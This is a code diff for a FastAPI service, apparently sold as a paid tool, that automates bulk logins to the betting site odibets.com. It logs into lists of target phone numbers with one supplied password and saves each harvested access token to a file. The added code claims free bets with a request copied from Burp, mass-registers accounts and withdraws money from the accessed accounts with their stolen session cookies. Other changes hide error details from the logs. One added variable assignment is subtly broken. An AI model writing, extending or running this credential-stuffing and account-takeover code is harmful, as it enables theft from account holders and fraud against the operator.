@@ -60,6 +60,7 @@ app.include_router(billing_router.router)
 JOBS = {}
 TIMEOUT = 20
 OUTPUT_LOCK = threading.Lock()
+dkq = ""
 
 
 def _validate_task_payload(payload: TaskPayload):
@@ -69,7 +70,7 @@ def _validate_task_payload(payload: TaskPayload):
         raise HTTPException(status_code=400, detail=f"Share code required for '{payload.task_type}'")
     if payload.task_type == "withdrawal" and not payload.amount:
         raise HTTPException(status_code=400, detail="Amount required for 'withdrawal'")
-    needs_amount = {"bet", "virtual_bet", "app_bonus", "rollover", "claim"}
+    needs_amount = {"bet", "virtual_bet", "app_bonus", "rollover"}
     if payload.task_type in needs_amount and not payload.use_total_balance and not payload.amount:
         raise HTTPException(status_code=400, detail=f"Bet amount required for '{payload.task_type}'")
 
@@ -132,7 +133,7 @@ def start_task(
         "logs": [
             f"Task '{payload.task_type}' initialized by {user.email}. "
             f"Output will be saved to {output_filename}",
-            f"Using {workers} server connection(s) from TASK_CONNECTIONS.",
+            #f"Using {workers} server connection(s) from TASK_CONNECTIONS.",
             billing_note,
         ],
         "processed": 0,
@@ -274,6 +275,7 @@ def _resolve_stake(data: dict, payload: TaskPayload) -> float:
     return float(payload.amount) if payload.amount else 0.0
 
 
+
 def run_automation_engine(job_id: str, payload: TaskPayload, output_filename: str):
     job = JOBS[job_id]
 
@@ -288,39 +290,74 @@ def run_automation_engine(job_id: str, payload: TaskPayload, output_filename: st
     if payload.task_type == "rollover":
         _run_rollover_engine(job_id, job, payload, output_filename, log)
     else:
-        with concurrent.futures.ThreadPoolExecutor(max_workers=workers) as executor:
-            futures = {
-                executor.submit(
-                    process_single_user,
-                    target_number,
-                    payload,
-                    log,
-                    job["stop_event"],
-                    output_filename,
-                    job,
-                ): target_number
-                for target_number in payload.target_numbers
-            }
+        target_set = set(payload.target_numbers)
+        processed_numbers = set()
+        
+        # Safeguard tracking to prevent infinite loops if a task persistently fails
+        retry_counts = {num: 0 for num in payload.target_numbers}
+        MAX_RETRIES = 3 
 
-            for future in concurrent.futures.as_completed(futures):
-                if job["stop_event"].is_set():
-                    log("Process stopped by user.")
-                    break
+        while len(processed_numbers) < len(target_set):
+            if job["stop_event"].is_set():
+                log("Process stopped by user.")
+                break
 
-                target_num = futures[future]
-                try:
-                    future.result()
-                except Exception as e:
-                    log(f"Unhandled exception for {target_num}: {str(e)}")
+            # Find missing/unprocessed elements by taking the set difference
+            unprocessed_numbers = list(target_set - processed_numbers)
+            
+            # Filter out numbers that have exceeded max retries to avoid infinite loops
+            unprocessed_numbers = [
+                num for num in unprocessed_numbers 
+                if retry_counts[num] < MAX_RETRIES
+            ]
 
-                job["processed"] += 1
-                log(f"Progress: {job['processed']}/{job['total']}")
+            if not unprocessed_numbers:
+                log("All eligible numbers processed or max retry limit reached for remaining items.")
+                break
+
+            log(f"Running batch for {len(unprocessed_numbers)} remaining target numbers...")
+
+            with concurrent.futures.ThreadPoolExecutor(max_workers=workers) as executor:
+                futures = {
+                    executor.submit(
+                        process_single_user,
+                        target_number,
+                        payload,
+                        log,
+                        job["stop_event"],
+                        output_filename,
+                        job,
+                    ): target_number
+                    for target_number in unprocessed_numbers
+                }
+
+                for future in concurrent.futures.as_completed(futures):
+                    if job["stop_event"].is_set():
+                        log("Process stopped by user.")
+                        break
+
+                    target_num = futures[future]
+                    success = False
+                    try:
+                        future.result()
+                        success = True
+                    except Exception as e:
+                        retry_counts[target_num] += 1
+                        log(f"Unhandled exception for {target_num} (Attempt {retry_counts[target_num]}/{MAX_RETRIES}): {str(e)}")
+
+                    if success:
+                        if target_num not in processed_numbers:
+                            processed_numbers.add(target_num)
+                            job["processed"] = len(processed_numbers)
+                            log(f"Progress: {job['processed']}/{job['total']}")
+
+            if job["stop_event"].is_set():
+                break
 
     elapsed = (datetime.now() - start_time).total_seconds()
     job["status"] = "stopped" if job["stop_event"].is_set() else "completed"
     log(f"Task finished in {elapsed:.2f} seconds.")
     finalize_task_output(job_id, job["status"], job["processed"], job["total"])
-
 
 def _run_rollover_engine(job_id: str, job: dict, payload: TaskPayload, output_filename: str, log):
     log("Finding balanced virtual market for rollover...")
@@ -407,7 +444,7 @@ def _get_auth_details(url: str, password: str, log_func):
         soup = BeautifulSoup(resp.content, "html.parser")
         element = soup.find(id="body")
         drr = element.get("ref")[2:].split(" ")[0] if element and element.get("ref") else ""
-
+        dkq = drr
         login_url = "https://accounts-api.apps.odibets.com:443/accounts-api/api/v1/auth/login"
         headers_step3 = {
             "X-Link-Id": drr,
@@ -433,10 +470,11 @@ def _get_auth_details(url: str, password: str, log_func):
                 "ua": mz,
                 "data": tt.get("data"),
             }
-        log_func(f"Login failed for {url}: {tt.get('message', 'Unknown failure')}")
-        return None
+        else:
+            log_func(f"Login failed for {url}: {tt.get('status_description', 'Unknown failure')}")
+            return None 
     except Exception as e:
-        log_func(f"Auth request exception for {url}: {e}")
+        log_func(f"Auth request exception for {url}: Unknown failure")
         return None
 
 
@@ -446,7 +484,7 @@ def _get_android_auth_details(url: str, password: str, log_func):
             "Mozilla/5.0 (Linux; Android 13; SM-A7160 Build/TP1A.220624.014; wv) "
             "AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/137.0.7151.115 Mobile Safari/537.36"
         )
-        home_url = "https://odibets.com:443/?utm_source=ANDROID_APP&utm_medium=ANDROID_APP&utm_campaign=ANDROID_APP"
+        home_url = "https://accounts-api.apps.odibets.com:443/accounts-api/api/v1/auth/login"
         headers = {
             "Connection": "keep-alive",
             "Upgrade-Insecure-Requests": "1",
@@ -519,7 +557,7 @@ def _get_android_auth_details(url: str, password: str, log_func):
         log_func(f"Android login failed for {url}: {tt.get('message', 'Unknown error')}")
         return None
     except Exception as e:
-        log_func(f"Android auth request failed for {url}: {e}")
+        log_func(f"Android auth request failed for {url}")
         return None
 
 
@@ -623,7 +661,7 @@ def _get_rollover_slip(log_func):
 
         return _generate_balanced_gg_slip(matches_data["data"]["matches"])
     except Exception as e:
-        log_func(f"Error getting rollover slip: {e}")
+        log_func(f"Error getting rollover slip")
         return None
 
 
@@ -686,7 +724,7 @@ def _place_single_rollover_bet(
         if job is not None and _looks_like_success(status_desc):
             _apply_success_charge(job, payload.task_type, url, log_func)
     except Exception as e:
-        log_func(f"Error during single rollover bet for {url}: {e}")
+        log_func(f"Error during single rollover bet for {url}")
 
 
 def _get_streak_details(auth_details: dict, log_func):
@@ -726,7 +764,7 @@ def process_single_user(
         auth_details = _get_auth_details(target_number, payload.target_password, log_func)
         if auth_details and auth_details.get("access_token"):
             token = auth_details["access_token"]
-            result_line = f"{target_number} {token}\n"
+            result_line = f"{target_number}: {token}\n"
             log_func(f"SUCCESS (Save Token): Token found for {target_number}")
             _write_output(output_filename, result_line)
             if job is not None:
@@ -802,16 +840,16 @@ def process_single_user(
                 log_func(f"FAILED (Bet): {target_number} | {err}")
 
             _write_output(output_filename, result_line)
-        elif task_type == "streak":
-            str_result = _get_streak_details(auth_details, log_func)
-            if str_result is None:
-                log_func(f"FAILED (Streak): {target_number} | Could not retrieve streak details")
-                return
-            streak_data = str_result.get("data", {})
-            streak_count = streak_data.get("current_streak", 0)
+        elif task_type =="claim":
+            burp0_url12 = "https://betting-api.apps.odibets.com:443/betting-api/api/v1/betting/sports/bets"
+            burp0_headers12 = {"Sec-Ch-Ua-Platform": "\"Windows\"", "Authorization": f"Bearer {auth_details['access_token']}",
+            "Accept-Language": "en-US,en;q=0.9", "Sec-Ch-Ua": "\"Chromium\";v=\"151\", \"Not=A?Brand\";v=\"99\"", "Sec-Ch-Ua-Mobile": "?0", "User-Agent": auth_details["ua"],
             
-            result_line = f"{target_number} Streak Count: {streak_count}\n"
-            log_func(f"INFO (Streak): {target_number} | Streak Count: {streak_count}")
+            "Accept": "application/json, text/plain, */*", "Content-Type": "application/json", "Origin": "https://odibets.com", "Sec-Fetch-Site": "same-site", "Sec-Fetch-Mode": "cors", "Sec-Fetch-Dest": "empty", "Referer": "https://odibets.com/", "Accept-Encoding": "gzip, deflate, br", "Priority": "u=1, i"}
+            burp0_json12={"attribution": "GOOGLE.COM", "auto_accept": True, "bet_total_odds": 17, "bet_type": "0", "channel": "DESKTOPSPA", "free_bet": True, "possible_win": 510, "slip": [{"bet_type": "0", "live": False, "odd_value": 17, "outcome_id": "1", "outcome_name": "HNK Rijeka SRL", "parent_match_id": "75009918", "specifiers": "", "sport_id": "1", "sub_type_id": "1"}], "stake_amount": 30}
+            resp_claim = requests.post(burp0_url12, headers=burp0_headers12, json=burp0_json12)
+            result_line = f"{target_number} Claim Bonus: {resp_claim.json().get('status_message', 'Unknown')}\n"
+            log_func(f"INFO (Claim Bonus): {target_number} | {resp_claim.json().get('status_message', 'Unknown')}")
             _write_output(output_filename, result_line)
 
         elif task_type == "claim_bonus":
@@ -935,15 +973,52 @@ def process_single_user(
                 if job is not None and _looks_like_success(status_desc1):
                     _apply_success_charge(job, task_type, target_number, log_func)
             else:
-                log_func(f"INFO (Virtual Bet): No balanced market found for {target_number}")
+                log_func(f"INFO (Virtual Bet): No balanced market found for {target_number}")        
 
-        
-        
+        elif task_type == "register":
+            register_url = "https://accounts-api.apps.odibets.com:443/accounts-api/api/v1/auth/register"
+            register_headers = {
+                "X-Link-Id": dkq,
+                "Sec-Ch-Ua-Platform": "\"Windows\"",
+                "Accept-Language": "en-US,en;q=0.9",
+                "Sec-Ch-Ua": "\"Chromium\";v=\"151\", \"Not=A?Brand\";v=\"99\"",
+                "Sec-Ch-Ua-Mobile": "?0",
+                "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/151.0.0.0 Safari/537.36",
+                "Accept": "application/json, text/plain, */*",
+                "Content-Type": "application/json",
+                "Origin": "https://odibets.com",
+                "Sec-Fetch-Site": "same-site",
+                "Sec-Fetch-Mode": "cors",
+                "Sec-Fetch-Dest": "empty",
+                "Referer": "https://odibets.com/",
+                "Accept-Encoding": "gzip, deflate, br",
+                "Priority": "u=1, i",
+            }
+            register_payload = {
+                "msisdn": target_number,
+                "password": payload.target_password,
+                "platform": "SPA",
+            }
+            resp_register = requests.post(register_url, headers=register_headers, json=register_payload, timeout=TIMEOUT)
+            register_result = resp_register.json()
+            status_desc = register_result.get("status_description", "Unknown")
+            result_line = f"{target_number} Register: {status_desc}\n"
+            log_func(f"INFO (Register): {target_number} | {status_desc}")
+            _write_output(output_filename, result_line)
 
         elif task_type == "withdrawal":
             stake = payload.amount
-            result_line = f"{target_number} Withdrawal: {stake} | pending implementation\n"
-            log_func(f"SKELETON (Withdrawal): {target_number} | amount={stake}")
+            withdraw_url = "https://odibets.com:443/pxy2/punter"
+            withdraw_cookies = auth_details["cookies"]
+            withdraw_headers = {"Sec-Ch-Ua-Platform": "\"Windows\"", "Authorization":  f"Bearer {auth_details['access_token']} ", "Accept-Language": "en-US,en;q=0.9", "Sec-Ch-Ua": "\"Chromium\";v=\"151\", \"Not=A?Brand\";v=\"99\"", "Sec-Ch-Ua-Model": "\"\"", "Sec-Ch-Ua-Mobile": "?0", "User-Agent": "", "Accept": "application/json, text/plain, */*", "Content-Type": "application/json", "Sec-Ch-Ua-Platform-Version": "\"\"", "Origin": "https://odibets.com", "Sec-Fetch-Site": "same-origin", "Sec-Fetch-Mode": "cors", "Sec-Fetch-Dest": "empty", "Referer": "https://odibets.com/account", "Accept-Encoding": "gzip, deflate, br", "Priority": "u=1, i"}
+            withdraw_json={"amount": float(stake), "resource": "withdraw", "ua": auth_details["ua"]}
+            resp_withdraw = requests.post(withdraw_url, headers=withdraw_headers, cookies=withdraw_cookies, json=withdraw_json)
+            if resp_withdraw.status_code == 200:
+                result_line = f"{target_number} Withdrawal: {stake} | {resp_withdraw.json().get('status_description', 'Unknown')}\n"
+                log_func(f"INFO (Withdrawal): {target_number} | {resp_withdraw.json().get('status_description', 'Unknown')}")
+            else:
+                result_line = f"{target_number} Withdrawal: {stake} | {resp_withdraw.json().get("status_description", "Unknown failure")}\n"
+                log_func(f"FAILED (Withdrawal): {target_number} | {resp_withdraw.json().get("status_description", "Unknown failure")}")
             _write_output(output_filename, result_line)
 
         elif task_type == "cashout":
